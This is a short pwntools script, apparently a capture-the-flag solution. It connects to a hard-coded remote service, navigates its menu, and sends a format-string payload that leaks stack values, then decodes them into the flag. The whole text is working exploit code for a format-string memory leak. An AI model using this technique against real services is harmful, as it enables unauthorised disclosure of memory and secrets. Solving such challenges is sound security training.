from pwn import *
import binascii

r = remote("83.136.255.150", 55088)

r.sendlineafter(b"Name: ", b"Link")
r.sendlineafter(b"Nickname: ", b"L")
r.sendlineafter(b"> ", b"2")
r.sendlineafter(b"> ", b"1")
r.sendlineafter(b"> ", b"2")

fmt_str = b"%22$x%21$x%20$x%19$x%18$x%17$x%16$x%15$x%14$x%13$x%12$x"

r.sendlineafter(b"> ", fmt_str)

r.recvline()
r.recvline()

raw = r.recvline().decode("utf-8")

pares = [raw[i:i+2] for i in range(0, len(raw), 2)]
flag = binascii.unhexlify(''.join(pares[::-1]).strip()).decode("utf-8")

log.success(f"FLAG: {flag}")
